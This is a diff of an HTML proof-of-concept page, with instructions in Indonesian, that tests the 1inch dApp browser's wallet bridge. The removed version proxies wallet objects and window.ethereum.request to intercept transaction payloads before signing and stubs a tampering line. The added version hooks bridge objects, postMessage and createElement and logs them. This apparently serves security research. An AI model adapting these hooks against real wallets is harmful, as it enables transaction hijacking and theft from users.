@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>1inch Hijack Test v14 - Transaction Tampering POC</title>
+    <title>1inch Hijack Test v17 - Deep Native Bridge Bypass</title>
     <script>
         function log(msg, color = "black") {
-            console.log("[1inch-v14] " + msg);
+            console.log("[1inch-v17] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
             div.style.margin = "4px 0";
@@ -17,91 +17,73 @@
             document.body.prepend(div);
         }
 
-        // Fungsi untuk mendeteksi dan mencoba mengubah payload transaksi
-        function interceptAndTamper(args) {
-            try {
-                args.forEach((arg, index) => {
-                    if (arg && typeof arg === 'object') {
-                        log(`[!] Inspecting argument [${index}]: ${JSON.stringify(arg)}`, "purple");
-                        
-                        // Cek apakah ada struktur data transaksi standar (EVM / Solana)
-                        if (arg.to || arg.data || arg.value || arg.method) {
-                            log(`🚨 BINGO! Transaction payload detected in argument [${index}]`, "#d00");
-                            
-                            // CONTOH POCO TAMPERING: Mencoba memodifikasi nilai tujuan (to) atau value jika diizinkan
-                            // arg.value = "0x0"; 
-                            
-                            log(`⚠️ PoC: Successfully intercepted transaction parameters before native signing!`, "red");
+        // 1. Interceptor untuk menangkap semua properti baru yang disuntikkan ke window secara dinamis
+        const hookedProps = new Set();
+        function monitorWindowProperties() {
+            const keys = Object.getOwnPropertyNames(window);
+            keys.forEach(key => {
+                if ((key.toLowerCase().includes('wallet') || key.toLowerCase().includes('inch') || key.toLowerCase().includes('bridge')) && !hookedProps.has(key)) {
+                    hookedProps.add(key);
+                    log(`[+] Discovered dynamic bridge object: window.${key}`, "blue");
+                    
+                    try {
+                        const target = window[key];
+                        if (typeof target === 'object' && target !== null) {
+                            window[key] = new Proxy(target, {
+                                get(t, p, r) {
+                                    const val = Reflect.get(t, p, r);
+                                    if (typeof val === 'function' && p !== 'accountChanged' && p !== 'chainChanged') {
+                                        log(`🚨 CALLED ${key}.${p}(...)`, "#d00");
+                                    }
+                                    return val;
+                                }
+                            });
                         }
-                    }
-                });
-            } catch (e) {
-                log(`[-] Error during payload inspection: ${e.message}`, "orange");
-            }
-        }
-
-        // Memasang trap menyeluruh pada objek bridge dan provider umum
-        function setupTransactionInterceptor() {
-            log("[+] Initializing Transaction Interceptor v14...", "blue");
-
-            // 1. Trap pada window.OneInchIOSWallet jika ada
-            ['OneInchIOSWallet', 'OneInchSolanaWallet'].forEach(walletName => {
-                if (window[walletName]) {
-                    const originalObj = window[walletName];
-                    window[walletName] = new Proxy(originalObj, {
-                        get(target, prop, receiver) {
-                            const val = Reflect.get(target, prop, receiver);
-                            if (typeof val === 'function') {
-                                return function(...args) {
-                                    log(`🚨 CALLED ${walletName}.${prop}(...)`, "#d00");
-                                    interceptAndTamper(args);
-                                    return val.apply(this, args);
-                                };
-                            }
-                            return val;
-                        },
-                        apply(target, thisArg, args) {
-                            log(`🚨 APPLIED ${walletName}(...)`, "#d00");
-                            interceptAndTamper(args);
-                            return target.apply(thisArg, args);
-                        }
-                    });
-                    log(`[+] Successfully armed interceptor on window.${walletName}`, "green");
+                    } catch (e) {}
                 }
             });
-
-            // 2. Trap juga pada window.ethereum standar jika disuntikkan bersamaan
-            if (window.ethereum && !window.ethereum.__isHijackedV14) {
-                const originalRequest = window.ethereum.request;
-                window.ethereum.request = function(requestArgs) {
-                    log(`🚨 ETHEREUM.REQUEST CALLED: ${JSON.stringify(requestArgs)}`, "#d00");
-                    if (requestArgs && requestArgs.method && requestArgs.method.includes('send')) {
-                        interceptAndTamper(requestArgs.params || []);
-                    }
-                    return originalRequest.apply(this, arguments);
-                };
-                window.ethereum.__isHijackedV14 = true;
-                log("[+] Successfully armed interceptor on window.ethereum.request", "green");
-            }
         }
 
+        // 2. Interceptor postMessage tingkat lanjut untuk payload kustom
+        const originalPostMessage = window.postMessage;
+        window.postMessage = function(message, targetOrigin, transfer) {
+            try {
+                const msgStr = typeof message === 'string' ? message : JSON.stringify(message);
+                log(`[postMessage Out] ${msgStr.substring(0, 100)}`, "purple");
+                if (msgStr.length > 5 && !msgStr.includes('accountChanged')) {
+                    log(`🚨 CRITICAL: Custom bridge payload sent via postMessage!`, "#d00");
+                }
+            } catch (e) {}
+            return originalPostMessage.apply(this, arguments);
+        };
+
+        // 3. Interceptor createElement untuk melihat apakah ada iframe / script tersembunyi
+        const originalCreateElement = document.createElement;
+        document.createElement = function(tagName) {
+            const element = originalCreateElement.apply(this, arguments);
+            if (tagName.toLowerCase() === 'iframe' || tagName.toLowerCase() === 'script') {
+                log(`[DOM] Created element: <${tagName}>`, "orange");
+            }
+            return element;
+        };
+
         window.onload = function() {
-            log("1inch Transaction Hijack Test v14 Loaded");
-            setInterval(setupTransactionInterceptor, 1000);
+            log("1inch Hijack Test v17 Loaded. Memantau native bridge kustom...");
+            setInterval(monitorWindowProperties, 1000);
         };
     </script>
 </head>
 <body style="padding:15px; font-family:Arial; background-color: #f9f9f9;">
-    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v14</h3>
-    <p style="color: #555; font-size: 13px;">Advanced Transaction & Payload Tampering POC...</p>
+    <h3 style="color: #111; margin-top:0;">1inch Hijack Test v17</h3>
+    <p style="color: #555; font-size: 13px;">Deep Native Bridge & Custom Event Bypass POC...</p>
     <hr style="border:0; border-top:1px solid #ccc; margin:10px 0;">
     
     <div style="background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #333;">Instruksi Pengujian v14:</h4>
+        <h4 style="margin: 0 0 8px 0; color: #333;">Instruksi Pengujian v17:</h4>
         <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
-            <li>Buka halaman ini di dApp browser 1inch.</li>
-            <li>Lakukan aksi Swap atau eksekusi kontrak/transaksi di dalam dApp.</li>
-            <li>Perhatikan apakah muncul log merah bertuliskan <b>BINGO! Transaction payload detected</b>.</li>
+            <li>Pasang kode ini ke laman uji Anda.</li>
+            <li>Buka di dApp browser 1inch dan lakukan proses <b>Swap</b>.</li>
+            <li>Amati apakah muncul log merah baru yang mendeteksi objek dinamis atau pesan kustom di luar jalur standar.</li>
         </ol>
     </div>
 </body>
